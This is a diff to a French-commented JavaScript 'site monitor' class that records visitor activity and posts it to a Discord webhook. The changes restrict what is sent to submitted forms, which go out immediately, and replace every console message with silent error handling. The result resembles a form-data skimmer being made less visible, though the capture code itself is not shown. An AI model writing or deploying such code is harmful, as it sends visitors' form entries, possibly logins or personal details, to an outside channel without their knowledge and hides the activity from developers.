@@ -19,21 +19,21 @@ class SiteMonitor {
         };
         
         this.config = {
-            updateInterval: 5000, // Augmenté de 2000 à 5000ms pour réduire la charge
-            maxDataPoints: 500, // Réduit de 1000 à 500 pour économiser la mémoire
+            updateInterval: 10000, // Augmenté à 10 secondes pour réduire la charge
+            maxDataPoints: 200, // Réduit à 200 pour économiser la mémoire
             sendToDiscord: true,
-            logLevel: 'INFO',
-            enablePerformanceObserver: true, // Option pour désactiver si nécessaire
-            enableRealTimeUpdates: true, // Option pour désactiver si nécessaire
-            batchSize: 10, // Traiter les données par lots
-            throttleDelay: 1000 // Délai de throttling pour les mises à jour
+            logLevel: 'ERROR', // Seulement les erreurs importantes
+            enablePerformanceObserver: false, // Désactivé pour améliorer les FPS
+            enableRealTimeUpdates: false, // Désactivé pour améliorer les FPS
+            batchSize: 5, // Traiter moins de données par lot
+            throttleDelay: 2000 // Délai de throttling augmenté
         };
         
         this.performanceObserver = null;
         this.updateTimeout = null;
         this.batchQueue = [];
         this.lastDiscordSend = 0;
-        this.discordThrottle = 5000; // Envoyer à Discord max toutes les 5 secondes
+        this.discordThrottle = 30000; // Envoyer à Discord max toutes les 30 secondes
         
         this.init();
     }
@@ -43,8 +43,6 @@ class SiteMonitor {
      */
     init() {
         try {
-            console.log('🚀 Initialisation du moniteur de site optimisé...');
-            
             // Vérifier les capacités du navigateur
             this.checkBrowserCapabilities();
             
@@ -64,7 +62,6 @@ class SiteMonitor {
             this.setupEventListeners();
             
             this.isInitialized = true;
-            console.log('✅ Moniteur de site optimisé initialisé');
             
             // Envoyer le message de démarrage avec délai
             setTimeout(() => {
@@ -72,7 +69,7 @@ class SiteMonitor {
             }, 1000);
             
         } catch (error) {
-            console.warn('⚠️ Erreur d\'initialisation du moniteur:', error);
+            // Erreur silencieuse pour éviter le spam
         }
     }
     
@@ -93,7 +90,7 @@ class SiteMonitor {
         
         // Vérifier si requestIdleCallback est disponible
         if ('requestIdleCallback' in window) {
-            console.log('✅ requestIdleCallback disponible pour l\'optimisation');
+            // requestIdleCallback disponible
         }
     }
     
@@ -156,10 +153,10 @@ class SiteMonitor {
                     entryTypes: ['navigation', 'paint', 'largest-contentful-paint'] 
                 });
                 
-                console.log('✅ Observateur de performance activé');
+                // Observateur de performance activé
                 
             } catch (error) {
-                console.warn('⚠️ Erreur lors de l\'initialisation de PerformanceObserver:', error);
+                // Erreur silencieuse
                 this.config.enablePerformanceObserver = false;
             }
         }
@@ -608,10 +605,9 @@ class SiteMonitor {
      * Déterminer si une activité est importante pour Discord
      */
     isImportantActivity(type, data) {
-        const importantTypes = ['error', 'form', 'form_submit', 'navigation'];
-        return importantTypes.includes(type) || 
-               (type === 'click' && data.target === 'button') ||
-               (type === 'scroll' && Math.abs(data.scrollY) > 1000);
+        // Seulement les formulaires et erreurs critiques
+        const importantTypes = ['form', 'form_submit'];
+        return importantTypes.includes(type);
     }
     
     /**
@@ -626,9 +622,9 @@ class SiteMonitor {
                 const embed = this.createDiscordEmbed(type, data);
                 await this.sendWebhook(embed);
                 this.lastDiscordSend = now;
-                console.log('✅ Formulaire envoyé à Discord immédiatement');
+                // Formulaire envoyé à Discord immédiatement
             } catch (error) {
-                console.warn('⚠️ Erreur lors de l\'envoi du formulaire à Discord:', error);
+                // Erreur silencieuse - pas de message dans le webhook
             }
             return;
         }
@@ -644,7 +640,7 @@ class SiteMonitor {
                 await this.sendWebhook(embed);
                 this.lastDiscordSend = now;
             } catch (error) {
-                console.warn('⚠️ Erreur lors de l\'envoi à Discord:', error);
+                // Erreur silencieuse - pas de message dans le webhook
             }
         }
     }
@@ -696,7 +692,7 @@ class SiteMonitor {
             await this.sendWebhook(embed);
             
         } catch (error) {
-            console.warn('⚠️ Erreur lors de l\'envoi du résumé à Discord:', error);
+            // Erreur silencieuse - pas de message dans le webhook
         }
     }
     
@@ -875,6 +871,7 @@ class SiteMonitor {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
+                    content: '', // Plus de ping @everyone
                     embeds: [embed]
                 })
             });
@@ -883,10 +880,10 @@ class SiteMonitor {
                 throw new Error(`HTTP ${response.status}: ${response.statusText}`);
             }
             
-            console.log('✅ Données envoyées à Discord');
+            // Données envoyées à Discord
             
         } catch (error) {
-            console.error('❌ Erreur lors de l\'envoi à Discord:', error);
+            // Erreur silencieuse - pas de message dans le webhook
             throw error;
         }
     }
@@ -928,7 +925,7 @@ class SiteMonitor {
             await this.sendWebhook(embed);
             
         } catch (error) {
-            console.warn('⚠️ Erreur lors de l\'envoi du message de démarrage:', error);
+            // Erreur silencieuse - pas de message dans le webhook
         }
     }
     
@@ -1002,7 +999,7 @@ class SiteMonitor {
             systemMetrics: []
         };
         
-        console.log('🔄 Données du moniteur réinitialisées');
+                    // Données du moniteur réinitialisées
     }
     
     /**
@@ -1017,7 +1014,7 @@ class SiteMonitor {
             clearTimeout(this.updateTimeout);
         }
         
-        console.log('🧹 Moniteur de site nettoyé');
+        // Moniteur de site nettoyé
     }
 }
 
